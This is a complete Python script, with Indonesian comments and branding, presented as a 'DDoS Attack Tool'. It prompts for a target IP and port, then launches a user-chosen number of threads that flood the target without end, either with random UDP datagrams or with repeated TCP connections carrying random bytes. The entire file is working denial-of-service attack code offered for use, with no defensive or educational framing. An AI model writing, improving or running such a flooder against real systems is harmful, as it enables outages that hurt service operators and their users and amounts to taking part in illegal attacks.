#!/usr/bin/env python3
# (c) VatieraSynth Dev — Semua hak cipta dilindungi
# Jangan ambil script tanpa izin, atau karma akan bicara😂
# Discord Official: https://discord.gg/fRDAvXsU

import os
import socket
import threading
import random
import time

RED = '\033[91m'
GREEN = '\033[92m'
CYAN = '\033[96m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
RESET = '\033[0m'
BOLD = '\033[1m'

# === Banner ===
os.system("clear")
print(f"""{BOLD}{MAGENTA}
   █████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██
  ██   {CYAN}VatieraSynth DDoS Attack Tool - VSD Premium{MAGENTA}   ██
  ██   {CYAN}Made with pride by VatieraSynth Dev (c)      {MAGENTA}   ██
  ██▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄██
{RESET}""")

# === Input Area ===
print(f"{BOLD}{YELLOW}Masukkan detail target di bawah ini:{RESET}")
ip = str(input(f"{CYAN}» IP Target: {RESET}"))
port = int(input(f"{CYAN}» Port Target: {RESET}"))
choice = str(input(f"{CYAN}» Gunakan UDP? (y/n): {RESET}")).lower()
times = int(input(f"{CYAN}» Jumlah Packet per Thread: {RESET}"))
threads = int(input(f"{CYAN}» Jumlah Threads: {RESET}"))

def udp_attack():
    data = random._urandom(1024)
    i = random.choice([f"{GREEN}[•]", f"{CYAN}[#]", f"{YELLOW}[!]"])
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr)
            print(f"{i} {MAGENTA}| UDP Attack Sent to {ip}:{port} |{RESET}")
        except Exception:
            print(f"{RED}[!] Error sending UDP packets!{RESET}")

def tcp_attack():
    data = random._urandom(16)
    i = random.choice([f"{GREEN}[+]", f"{CYAN}[~]", f"{YELLOW}[>]"])
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            for x in range(times):
                s.send(data)
            s.close()
            print(f"{i} {MAGENTA}| TCP Attack sent to {ip}:{port} |{RESET}")
        except Exception:
            print(f"{RED}[x] TCP Failed to connect!{RESET}")

print(f"\n{BOLD}{BLUE}Launching Attack with {threads} Threads...{RESET}")
time.sleep(2)
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=udp_attack)
        th.start()
    else:
        th = threading.Thread(target=tcp_attack)
        th.start()
